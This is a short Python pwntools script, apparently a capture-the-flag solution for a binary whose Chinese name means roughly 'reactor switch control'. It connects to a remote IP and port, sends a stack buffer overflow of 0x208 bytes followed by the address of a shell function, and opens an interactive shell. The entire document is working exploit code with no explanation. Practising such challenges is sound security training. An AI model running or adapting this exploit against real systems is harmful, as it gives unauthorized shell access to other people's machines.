#!usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
r = remote('220.249.52.133',45210)
elf = ELF('./反应釜开关控制')
#shell_addr = elf.symbols['shell']
shell_addr = 0x04005F6
payload = 'A'*0x208 + p64(shell_addr)
r.sendlineafter('>',payload)
r.interactive()